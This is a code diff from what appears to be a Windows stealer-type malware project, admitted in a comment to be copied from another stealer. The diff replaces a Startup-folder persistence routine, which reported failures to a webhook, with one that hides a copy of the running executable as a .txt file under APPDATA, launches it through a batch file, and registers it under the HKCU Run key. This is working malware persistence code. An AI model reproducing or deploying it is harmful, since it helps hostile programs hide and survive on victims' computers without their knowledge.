@@ -1,44 +1,44 @@
+# skidded from empyrean hahahhaha
+
+import subprocess
+import sys
 import os
 import shutil
-from dhooks import Embed
-from config import Config
-from __webhook import _WebhookX
-from sys import argv
-
-cc = Config()
-eb_color = cc.get_color()
 
 class Startup:
-    def __init__(self, cc_instance):
-        self.cc = cc_instance
-        self.roaming = os.getenv("appdata")
-        self.startup_loc = os.path.join(self.roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-        self.file_path = os.path.abspath(argv[0])
+    def __init__(self) -> None:
+        self.working_dir = os.getenv("APPDATA") + "\\rose"
 
-    def send_error_notification(self, exception):
-        webx = _WebhookX().get_object()
+        if self.check_self():
+            return
 
-        embed = Embed(
-            description='Error while copying to startup',
-            color=self.cc.get_color(),
-            timestamp='now'
-        )
+        self.mkdir()
+        self.write_stub()
+        self.regedit()
 
-        embed.set_author(name=self.cc.get_name(), icon_url=self.cc.get_avatar())
-        embed.set_footer(text=self.cc.get_footer(), icon_url=self.cc.get_avatar())
-        embed.add_field(name="Couldn't copy to startup or rename to scr | Help us by reporting this bug",
-                        value=f'Advanced Log: ```{exception}```')
+    def check_self(self) -> bool:
+        if os.path.realpath(sys.executable) == self.working_dir + "\\dat.txt":
+            return True
 
-        webx.send(embed=embed)
+        return False
 
-    def copy_to_startup(self):
-        try:
-            startup_file_path = os.path.join(self.startup_loc, os.path.basename(self.file_path))
-            shutil.copy(self.file_path, startup_file_path)
-            
-            if cc.use_scr:
-                new_startup_file_path = os.path.splitext(startup_file_path)[0] + ".scr"
-                os.rename(startup_file_path, new_startup_file_path)
-        except Exception as e:
-            self.send_error_notification(e)
-            
+    def mkdir(self) -> str:
+        if not os.path.isdir(self.working_dir):
+            os.mkdir(self.working_dir)
+
+        else:
+            shutil.rmtree(self.working_dir)
+            os.mkdir(self.working_dir)
+
+    def write_stub(self) -> None:
+        shutil.copy2(os.path.realpath(sys.executable),
+                     self.working_dir + "\\dat.txt")
+
+        with open(file=f"{self.working_dir}\\run.bat", mode="w") as f:
+            f.write(f"@echo off\ncall {self.working_dir}\\dat.txt")
+
+    def regedit(self) -> None:
+        subprocess.run(args=[
+                       "reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "rose", "/f"], shell=True)
+        subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                       "/v", "rose", "/t", "REG_SZ", "/d", f"{self.working_dir}\\run.bat", "/f"], shell=True)        
